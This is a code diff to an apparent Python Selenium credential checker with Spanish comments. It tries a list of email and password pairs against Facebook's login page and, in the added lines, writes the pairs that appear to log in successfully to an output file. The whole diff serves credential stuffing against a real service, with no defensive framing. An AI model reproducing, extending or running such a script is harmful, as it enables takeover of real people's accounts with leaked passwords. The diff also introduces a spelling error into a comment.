@@ -45,9 +45,9 @@ def test_facebook(usr,password):
       driver.find_element_by_id("loginbutton").click()
     except:
       print('POSIBLE LOGIN')
+      writeFileEmails(sys.argv[2],usr,password)
       writeFile(source,usr.replace("@", "_"))
       return
-    
     
     # Verifica si el inicio de sesión fue exitoso
     
@@ -58,7 +58,7 @@ def test_facebook(usr,password):
     except:
         print("Usuario o contraseña inválidos")
 
-    # Cierra la ventana del navegador
+    # Cierra la ventansa del navegador
     driver.quit()
 
 def readFile():
@@ -76,7 +76,14 @@ def writeFile(text,name):
      file1 = open("out/prueba_{0}.html".format(name),'a+')
      file1.write(text)
      file1.close()
+     
+def writeFileEmails(name,usr,passw):
+     file1 = open("out/{0}".format(name),'a+')
+     file1.write("{0}:{1}".format(usr,passw))
+     file1.close()
+     
 readFile()
+
 for account in accountsTest:
     # time.sleep(3)
     print("Probando {}:{}".format(account['account'],account['passw']))
